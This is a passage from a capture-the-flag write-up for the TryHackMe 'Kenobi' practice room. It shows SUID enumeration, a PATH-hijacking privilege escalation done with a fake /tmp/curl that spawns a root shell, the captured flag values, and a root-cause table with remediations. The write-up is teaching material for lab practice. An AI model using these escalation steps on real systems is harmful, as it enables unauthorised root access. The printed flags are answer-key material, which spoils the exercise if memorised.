-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 
```

This yields a shell as the `kenobi` user and access to the first flag (`user.txt`) in the home directory.

---

## 5. Privilege Escalation — SUID PATH Hijacking

### 5.1 Enumerate SUID Binaries

```bash
kenobi@kenobi:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 26 Jul 2026 03:22:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

Among the standard system SUID binaries, a **non-standard SUID binary** stands out — typically named something like `menu`. Running it presents a small menu of predefined actions (e.g., check `uptime`, check network status).

### 5.2 Identifying the Flaw

Inspecting how the binary invokes underlying system utilities (via `strings`, or simply observing its behavior) shows it calls commands like `curl`, `uname`, `ifconfig` **without specifying an absolute path**. Since the binary runs with SUID root privileges, and PATH-based command resolution is not hardened, this is a classic **PATH variable hijacking** vulnerability.

```bash
kenobi@kenobi:~$ curl -I localhost
HTTP/1.1 200 OK
Date: Sun, 26 Jul 2026 03:25:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ uname -r
5.15.0-139-generic
kenobi@kenobi:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.128.149.207  netmask 255.255.192.0  broadcast 10.128.191.255
        inet6 fe80::43a:37ff:fe6c:4dcd  prefixlen 64  scopeid 0x20<link>
        ether 06:3a:37:6c:4d:cd  txqueuelen 1000  (Ethernet)
        RX packets 4092  bytes 16253603 (16.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3984  bytes 1441178 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 480  bytes 47050 (47.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 480  bytes 47050 (47.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

kenobi@kenobi:~$ 
```

### 5.3 Exploiting PATH Hijacking

Create a malicious replacement for one of the unqualified commands (e.g., `curl`) that spawns a shell instead:

```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# 
# 
# cd /root
# ls -la
total 44
drwx------  6 root root 4096 Sep  3  2025 .
drwxr-xr-x 23 root root 4096 Jul 25 21:57 ..
-rw-------  1 root root   27 Sep  3  2025 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep  4  2019 .cache
drwx------  3 root root 4096 Aug  9  2025 .gnupg
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
-rw-r--r--  1 root root   75 Aug 10  2025 .selected_editor
drwx------  3 root root 4096 Aug  9  2025 snap
drwx------  2 root root 4096 Sep  3  2025 .ssh
-rw-------  1 root root    0 Sep  3  2025 .viminfo
# 
```

Then run the vulnerable SUID binary and trigger the menu option that internally calls the hijacked command:

```bash
/usr/bin/menu
# select the option that invokes curl
```

Because `/tmp` now precedes the real system PATH, the SUID binary executes the attacker-controlled `curl` script instead of the real binary — and since the SUID bit is set, it runs as **root**, dropping into a root shell.

### 5.4 Capture Root Flag

```bash
# whoami
root
# 
# 
# cd /root
# ls -la
total 44
drwx------  6 root root 4096 Sep  3  2025 .
drwxr-xr-x 23 root root 4096 Jul 25 21:57 ..
-rw-------  1 root root   27 Sep  3  2025 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep  4  2019 .cache
drwx------  3 root root 4096 Aug  9  2025 .gnupg
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
-rw-r--r--  1 root root   75 Aug 10  2025 .selected_editor
drwx------  3 root root 4096 Aug  9  2025 snap
drwx------  2 root root 4096 Sep  3  2025 .ssh
-rw-------  1 root root    0 Sep  3  2025 .viminfo
# cat root.txt
177b3cd8562289f37382721c28381f02
# exit                                                                                
kenobi@kenobi:/tmp$
```

!image.png

---

## 6. Post-Exploitation

- Confirm privilege escalation: `id`, `whoami`
- Capture both flags: `user.txt` (kenobi's home directory) and `root.txt` (`/root/`)
- Record all commands and outputs for the write-up/report

---

## 7. Root Cause Summary

| Weakness | Impact | Remediation |
| --- | --- | --- |
| Anonymous SMB share access | Disclosed internal service info (log file) that aided reconnaissance | Disable anonymous/guest SMB access; restrict share permissions |
| NFS export of `/var` without restriction | Broadened attack surface; potential for unauthorized read/write | Restrict NFS exports to specific hosts; use `root_squash` and minimal permissions |
| Outdated ProFTPD (1.3.5) with `mod_copy` flaw | Allowed unauthenticated server-side file copy → SSH key theft / RCE | Patch/upgrade FTP daemon; disable unused modules like `mod_copy`; require authentication for file operations |
| World-readable SSH private key | Enabled direct authentication once the key was exfiltrated | Restrict key file permissions (600, owner-only); disable key readability by other accounts |
| Custom SUID binary calling commands without absolute paths | Enabled PATH hijacking to escalate to root | Hardcode absolute paths in privileged binaries; avoid unnecessary SUID bits; sanitize/reset PATH within privileged programs |

---

## 8. Attack Chain Summary

```
SMB anonymous share → log.txt (service info)
    → NFS/RPC enumeration (context, not directly exploited)
    → ProFTPD 1.3.5 mod_copy flaw → SSH private key exfiltrated
    → SSH login as kenobi → user.txt
    → SUID binary (menu) with unqualified PATH calls
    → PATH hijack → root shell → root.txt
```

---

*Write-up prepared for personal portfolio/documentation purposes on a public TryHackMe practice room.*
